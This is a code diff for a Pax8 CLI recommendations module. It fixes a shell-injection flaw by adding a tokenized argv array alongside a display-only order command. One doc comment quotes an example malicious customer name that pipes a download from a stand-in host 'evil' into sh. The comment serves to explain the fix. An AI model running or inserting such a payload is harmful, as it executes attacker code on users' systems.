@@ -287,8 +287,34 @@ export interface Recommendation {
   title: string;
   reason: string;
   suggestedProducts: string[];
-  /** The exact CLI command to execute this recommendation */
+  /**
+   * The exact CLI command to execute this recommendation.
+   *
+   * Informational / display-only. The string is built by interpolating the
+   * upstream-controlled `companyName` (a value the partner-tenant owner could
+   * influence via the customer record) into a shell template. It is safe to
+   * print, but unsafe to hand to a shell verbatim — a malicious customer
+   * name like `Acme" $(curl evil/x|sh) "` produces a working shell payload
+   * once a user (or an LLM tool-using agent) pastes it into `bash -c`.
+   *
+   * Programmatic execution paths MUST use `orderArgs` instead. See #462.
+   */
   orderCommand: string | null;
+  /**
+   * The same order as `orderCommand`, pre-tokenized as an argv-style array.
+   * Safe to hand to `spawn()`/`execFile()`/the REPL tokenizer without any
+   * shell involvement: the customer name (and any other interpolated value)
+   * lands as a single argv element, so shell metacharacters cannot escape
+   * out of it.
+   *
+   * `null` when `orderCommand` is `null` (no orderable product matched).
+   * The first element is always the `pax8` argv0 so the array can be
+   * dropped into `spawn("node", [cliPath, ...orderArgs.slice(1)])`.
+   *
+   * Prefer this field over `orderCommand` for any caller that intends to
+   * execute the recommendation. See #462.
+   */
+  orderArgs: string[] | null;
   /** Whether the recommended product is available and orderable in the Pax8 catalog */
   productAvailable: boolean;
   /** Current MRR for this company */
@@ -370,6 +396,64 @@ export function getPortfolioCoverage(
   }
 
   return result;
+}
+
+// UUID-shape detector — the Pax8 API returns RFC-4122 UUIDs for company IDs.
+// We use this to decide whether `companyId` is preferable to `companyName`
+// for the `--company` value in the displayed `orderCommand` string. The
+// argv form (`orderArgs`) always includes the name as a single argv element,
+// so the safety story does not depend on this — but a UUID in the display
+// string is one less surface that has to survive a copy-paste through a
+// not-quite-careful shell.
+const UUID_SHAPE_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+
+/**
+ * Build the `orderCommand` display string and the matching `orderArgs`
+ * argv-style array for an order-create recommendation.
+ *
+ * Display contract (`orderCommand`):
+ *   - When `companyId` looks like a UUID, prefer it over `companyName` —
+ *     UUIDs are inert under shell evaluation, and using one closes the
+ *     `Acme" $(...) "`-style injection vector at the display layer too.
+ *   - Otherwise (demo mode, legacy IDs that aren't UUIDs), fall back to
+ *     `"${companyName}"`. The string is informational only — callers that
+ *     intend to *execute* should use `orderArgs`. See #462.
+ *
+ * Argv contract (`orderArgs`):
+ *   - First element is always `"pax8"` so the array can be dropped into a
+ *     spawn() call or the REPL tokenizer verbatim.
+ *   - The customer name lands as a single argv element regardless of which
+ *     shell metacharacters it contains — no quoting, no escaping, no shell.
+ *   - `--company` value carries the same identifier (UUID if available,
+ *     else the name) as the display string, so the two forms stay in sync.
+ */
+function buildOrderArtifacts(
+  companyId: string,
+  companyName: string,
+  productId: string,
+  quantity: number,
+): { orderCommand: string; orderArgs: string[] } {
+  const useUuid = UUID_SHAPE_RE.test(companyId);
+  const companyToken = useUuid ? companyId : companyName;
+  // Display string: when we use the UUID, it's bare (no quotes); when we
+  // fall back to the name, wrap in double quotes so a single-word display
+  // still parses as one --company value if a user does paste it. The
+  // safety story does not rely on this quoting — `orderArgs` is the
+  // safe path.
+  const companyDisplay = useUuid ? companyToken : `"${companyToken}"`;
+  const orderCommand = `pax8 orders create --company ${companyDisplay} --product ${productId} --quantity ${quantity}`;
+  const orderArgs = [
+    "pax8",
+    "orders",
+    "create",
+    "--company",
+    companyToken,
+    "--product",
+    productId,
+    "--quantity",
+    String(quantity),
+  ];
+  return { orderCommand, orderArgs };
 }
 
 export function getRecommendations(
@@ -510,9 +594,15 @@ export function getRecommendations(
         if (!productAvailable && suggestedName) {
           unmatchedProducts.add(suggestedName);
         }
-        const orderCommand = matchedProductId
-          ? `pax8 orders create --company "${companyName}" --product ${matchedProductId} --quantity ${primaryQty}`
+        // #462: emit both an informational display string and a safe argv
+        // array. Callers (REPL, recommendations act, Claude skill) must
+        // execute via `orderArgs` so an upstream-controlled customer name
+        // can never break out into a shell substitution.
+        const artifacts = matchedProductId
+          ? buildOrderArtifacts(companyId, companyName, matchedProductId, primaryQty)
           : null;
+        const orderCommand = artifacts?.orderCommand ?? null;
+        const orderArgs = artifacts?.orderArgs ?? null;
 
         // Demote to medium priority when the product isn't available/orderable
         const effectivePriority: "high" | "medium" | "low" = productAvailable
@@ -539,6 +629,7 @@ export function getRecommendations(
           reason: rule.reason,
           suggestedProducts: [resolvedProductName, ...rule.suggestedProducts.slice(1)],
           orderCommand,
+          orderArgs,
           productAvailable,
           currentMrr: Number(currentMrr.toFixed(2)),
           estimatedMrrUplift: estimatedMrrUplift !== null ? Number(estimatedMrrUplift.toFixed(2)) : null,
@@ -554,10 +645,13 @@ export function getRecommendations(
       const price = productPriceMap.get(gap.gapProduct.toLowerCase());
       const estimatedMrrUplift = price ? price * gap.missingSeats : null;
 
-      // For seat gaps, use the product ID directly from the subscription
-      const orderCommand = gap.gapProductId
-        ? `pax8 orders create --company "${companyName}" --product ${gap.gapProductId} --quantity ${gap.missingSeats}`
+      // For seat gaps, use the product ID directly from the subscription.
+      // See buildOrderArtifacts for the shell-injection rationale (#462).
+      const seatArtifacts = gap.gapProductId
+        ? buildOrderArtifacts(companyId, companyName, gap.gapProductId, gap.missingSeats)
         : null;
+      const orderCommand = seatArtifacts?.orderCommand ?? null;
+      const orderArgs = seatArtifacts?.orderArgs ?? null;
 
       recommendations.push({
         companyId,
@@ -576,6 +670,7 @@ export function getRecommendations(
         reason: `${gap.baseProduct} covers ${gap.baseQuantity} seats but ${gap.gapProduct} only covers ${gap.gapQuantity}. ${gap.missingSeats} seats are unprotected.`,
         suggestedProducts: [gap.gapProduct],
         orderCommand,
+        orderArgs,
         productAvailable: true, // seat gaps reference products already in use
         currentMrr: Number(currentMrr.toFixed(2)),
         estimatedMrrUplift: estimatedMrrUplift !== null ? Number(estimatedMrrUplift.toFixed(2)) : null,
@@ -608,6 +703,7 @@ export function getRecommendations(
           reason: "This customer has no active subscriptions. Consider reaching out to discuss their needs.",
           suggestedProducts: [],
           orderCommand: null,
+          orderArgs: null,
           productAvailable: false,
           currentMrr: 0,
           estimatedMrrUplift: null,
